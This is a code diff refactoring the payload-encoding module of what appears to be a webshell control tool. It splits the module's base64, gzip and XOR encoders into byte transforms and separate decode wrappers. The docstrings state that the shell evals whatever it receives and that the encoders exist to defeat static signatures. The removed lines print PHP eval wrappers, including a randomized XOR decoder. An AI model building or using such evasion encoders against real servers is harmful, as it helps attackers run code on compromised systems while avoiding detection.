@@ -1,12 +1,13 @@
-"""Pluggable payload encoders.
+"""Payload encoding, split into two reusable halves (see ``docs/ARCHITECTURE.md``).
 
-The webshell ``eval``s whatever we place in its parameter, so an *encoder* turns
-a piece of PHP into the PHP we actually send — varying how the payload looks on
-the wire (to frustrate static signatures) while decoding to the same code
-server-side. This is v1's unfinished TODO ("编写多种编码器") made real.
+A *byte transform* is language-neutral: it turns the payload bytes into a
+wire-safe base64 blob (optionally with parameters, e.g. an XOR key). A backend
+then supplies the matching *decode wrapper* — the language code that reverses
+the transform and runs the result. Splitting them this way means every backend
+reuses the same evasion strategies, and a new transform only has to be taught
+to each backend's wrapper once.
 
-Each encoder takes the (token-wrapped) PHP and returns a complete PHP statement
-that, when evaluated by the shell, runs it.
+This replaces v1's single ``Encoder`` callable that emitted PHP directly.
 """
 
 from __future__ import annotations
@@ -14,56 +15,70 @@ from __future__ import annotations
 import base64
 import string
 import zlib
-from collections.abc import Callable
+from abc import ABC, abstractmethod
+from dataclasses import dataclass, field
 
 from .utils.strings import random_string
 
-Encoder = Callable[[str], str]
+
+@dataclass(frozen=True)
+class EncodedPayload:
+    """The result of a byte transform: a wire-safe blob plus any parameters."""
+
+    name: str
+    b64: str  # base64 of the transformed bytes (always safe on the wire)
+    params: dict[str, str] = field(default_factory=dict)
 
 
-def base64_encode(php: str) -> str:
-    """``eval(base64_decode('...'))`` — the transport-safe default."""
-    encoded = base64.b64encode(php.encode()).decode()
-    return f"eval(base64_decode('{encoded}'));"
+class ByteTransform(ABC):
+    """Language-neutral byte-level transform of a payload."""
+
+    name: str = "abstract"
+
+    @abstractmethod
+    def apply(self, data: bytes) -> EncodedPayload:
+        """Transform ``data`` into a wire-safe :class:`EncodedPayload`."""
 
 
-def gzip_encode(php: str) -> str:
-    """``eval(gzinflate(base64_decode('...')))`` — smaller and different on the wire."""
-    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw DEFLATE for gzinflate()
-    data = compressor.compress(php.encode()) + compressor.flush()
-    return f"eval(gzinflate(base64_decode('{base64.b64encode(data).decode()}')));"
+class Base64Transform(ByteTransform):
+    name = "base64"
+
+    def apply(self, data: bytes) -> EncodedPayload:
+        return EncodedPayload("base64", base64.b64encode(data).decode())
 
 
-def xor_encode(php: str) -> str:
-    """XOR the payload with a random key, with randomized variable names.
+class GzipTransform(ByteTransform):
+    name = "gzip"
 
-    Both the key and the decoder's variable names change every request, so the
-    body has no stable byte signature.
-    """
-    key = random_string(8, string.ascii_letters)
-    raw = php.encode()
-    data = bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw))
-    encoded = base64.b64encode(data).decode()
-    var_d, var_k, var_o, var_i = (f"v{p}{random_string(4)}" for p in "dkoi")
-    return (
-        f"${var_d}=base64_decode('{encoded}');${var_k}='{key}';${var_o}='';"
-        f"for(${var_i}=0;${var_i}<strlen(${var_d});${var_i}++)"
-        f"{{${var_o}.=${var_d}[${var_i}]^${var_k}[${var_i}%strlen(${var_k})];}}"
-        f"eval(${var_o});"
-    )
+    def apply(self, data: bytes) -> EncodedPayload:
+        compressor = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw DEFLATE
+        raw = compressor.compress(data) + compressor.flush()
+        return EncodedPayload("gzip", base64.b64encode(raw).decode())
 
 
-ENCODERS: dict[str, Encoder] = {
-    "base64": base64_encode,
-    "gzip": gzip_encode,
-    "xor": xor_encode,
+class XorTransform(ByteTransform):
+    name = "xor"
+
+    def apply(self, data: bytes) -> EncodedPayload:
+        key = random_string(8, string.ascii_letters)
+        xored = bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(data))
+        return EncodedPayload("xor", base64.b64encode(xored).decode(), {"key": key})
+
+
+TRANSFORMS: dict[str, ByteTransform] = {
+    "base64": Base64Transform(),
+    "gzip": GzipTransform(),
+    "xor": XorTransform(),
 }
 
+# Backwards-friendly alias: the CLI lists encoder *names* from here.
+ENCODERS = TRANSFORMS
 
-def get_encoder(name: str) -> Encoder:
+
+def get_transform(name: str) -> ByteTransform:
     try:
-        return ENCODERS[name]
+        return TRANSFORMS[name]
     except KeyError:
         raise ValueError(
-            f"unknown encoder: {name!r}; choose from {', '.join(ENCODERS)}"
+            f"unknown encoder: {name!r}; choose from {', '.join(TRANSFORMS)}"
         ) from None
